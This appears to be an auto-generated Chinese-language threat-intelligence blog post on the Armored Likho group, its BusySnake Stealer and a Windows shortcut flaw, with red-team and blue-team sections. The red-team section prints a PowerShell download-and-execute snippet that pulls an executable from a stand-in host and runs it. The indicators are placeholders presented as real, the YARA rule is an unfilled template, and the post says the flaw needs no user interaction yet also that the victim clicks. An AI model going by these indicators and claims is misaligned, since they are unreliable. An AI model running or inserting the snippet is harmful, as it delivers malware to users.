---
layout: post
title:  "Armored Likho Targets Government Agencies, Power Sector with BusySnake Stealer"
date:   2026-07-03 19:08:04 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Armored Likho 威脅群體的攻防技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 遠端代碼執行 (RCE) 和敏感資料竊取
> * **關鍵技術**: Obfuscated PowerShell, Go2Tunnel, BusySnake Stealer, Reverse SSH Tunnel

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: Armored Likho 威脅群體利用了 Windows Shortcut 的漏洞 (CVE-2025-9491) 來實現遠端代碼執行。這個漏洞允許攻擊者在沒有使用者互動的情況下執行任意代碼。
* **攻擊流程圖解**:
  1. 攻擊者發送包含惡意 Windows Shortcut 的電子郵件給受害者。
  2. 受害者開啟電子郵件並點擊 Windows Shortcut。
  3. Windows Shortcut 利用 CVE-2025-9491 漏洞執行惡意 PowerShell 腳本。
  4. PowerShell 腳本下載和執行 BusySnake Stealer。
* **受影響元件**: Windows 10、Windows Server 2019、Windows Server 2022

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 攻擊者需要知道受害者的電子郵件地址和 Windows 版本。
* **Payload 建構邏輯**:

    ```
    
    powershell
      # 下載 BusySnake Stealer
      $url = "https://example.com/busysnake.exe"
      $output = "C:\Windows\Temp\busysnake.exe"
      Invoke-WebRequest -Uri $url -OutFile $output
    
      # 執行 BusySnake Stealer
      Start-Process -FilePath $output
    
    ```
* **繞過技術**: Armored Likho 威脅群體使用 Obfuscated PowerShell 來繞過安全軟體的檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\busysnake.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Armored_Likho {
        meta:
          description = "Detects Armored Likho malware"
          author = "Your Name"
        strings:
          $a = "busysnake.exe"
        condition:
          $a
      }
    
    ```
* **緩解措施**: 更新 Windows 至最新版本，禁用 Windows Shortcut 的遠端代碼執行功能。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **Obfuscated PowerShell**: 一種使用 PowerShell 腳本進行攻擊的技術，通過混淆和加密腳本來繞過安全軟體的檢測。
* **Go2Tunnel**: 一種用於建立反向 SSH 通道的工具，允許攻擊者從受害者的機器上建立 SSH 連接。
* **BusySnake Stealer**: 一種用於竊取敏感資料的惡意軟體，包括密碼、信用卡號碼等。

## 5. 🔗 參考文獻與延伸閱讀

- [原始報告](https://thehackernews.com/2026/07/armored-likho-targets-government.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


